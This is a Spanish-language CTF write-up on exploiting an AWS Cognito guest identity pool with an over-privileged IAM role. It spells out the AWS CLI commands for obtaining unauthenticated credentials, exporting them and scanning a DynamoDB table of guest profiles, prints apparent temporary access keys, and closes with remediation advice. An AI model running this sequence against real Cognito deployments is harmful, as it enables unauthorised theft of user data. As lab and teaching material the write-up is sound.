# Resolución CTF: Hacker Holidays - Complimentary (AWS Cognito Misconfiguration)

## Resumen del Incidente
Durante la evaluación de la aplicación web, se identificó una vulnerabilidad de configuración en AWS Cognito. La aplicación permitía acceso de invitados (unauthenticated guest access) para interactuar con los servicios de AWS de fondo (DynamoDB). Debido a un rol de IAM con privilegios excesivos (over-privileged IAM policy), fue posible evadir las restricciones de la interfaz web y extraer la base de datos completa de perfiles de huéspedes.

## Pasos de Explotación y Recuperación

### 1. Inspección del Código Fuente (Frontend)
Al inspeccionar el código fuente del lado del cliente (`app.js`), se extrajeron los parámetros de configuración de AWS Cognito utilizados para asignar acceso a invitados de forma silenciosa.

Parámetros descubiertos:
- `IDENTITY_POOL_ID`: `us-east-1:836c0949-292d-485b-b532-52d5ca7bb688`
- `AWS_REGION`: `us-east-1`
- `TABLE_NAME`: `complimentary-GuestWellnessProfiles`

### 2. Solicitud de un Identity ID Temporal
Con el ID del Identity Pool, se utilizó la herramienta AWS CLI para solicitar un identificador de sesión único (Identity ID) para un usuario no autenticado.

Comando ejecutado:
```bash
aws cognito-identity get-id \
  --region us-east-1 \
  --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"
```

### 3. Obtención de Credenciales Temporales de AWS (IAM)
Utilizando el Identity ID obtenido, se solicitaron las credenciales temporales de acceso (AccessKeyId, SecretKey y SessionToken) vinculadas al rol de invitado del Identity Pool.

Comando ejecutado:
```bash
aws cognito-identity get-credentials-for-identity \
  --region us-east-1 \
  --identity-id "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13"
```

### 4. Configuración del Entorno y Verificación de Identidad
Las credenciales obtenidas se exportaron como variables de entorno locales para instruir a AWS CLI a operar bajo ese perfil. Posteriormente, se verificó la identidad asumida.

Comandos ejecutados:
```bash
export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYKP67ULN3"
export AWS_SECRET_ACCESS_KEY="s20bKrmdV3va1tC8TQUoJ1lrc11yqAXRmXwkzqMi"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjELv..."
export AWS_DEFAULT_REGION="us-east-1"

aws sts get-caller-identity
```
Esto confirmó la asignación exitosa del rol `complimentary-cognito-unauth-role`.

### 5. Escaneo Directo de la Base de Datos (DynamoDB)
Para comprobar el verdadero límite de permisos de las credenciales, se evadió el filtrado de la aplicación y se consultó la tabla de DynamoDB directamente en busca de registros de otros usuarios.

Comando ejecutado:
```bash
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles
```
La consulta fue exitosa y retornó todos los registros, exponiendo la bandera oculta en las notas de uno de los perfiles.

## Conclusión y Remediación
La aplicación dependía erróneamente de la lógica de Javascript en el cliente para restringir el acceso a los datos de otros perfiles. El rol subyacente (`complimentary-cognito-unauth-role`) otorgaba permisos globales de `dynamodb:Scan` a cualquier usuario invitado.
Para asegurar este acceso, se debe aplicar Control de Acceso de Grano Fino (Fine-Grained Access Control - FGAC) dentro de la política IAM para que la base de datos solo permita consultar las filas que coincidan exactamente con el Identity ID asignado al usuario actual.
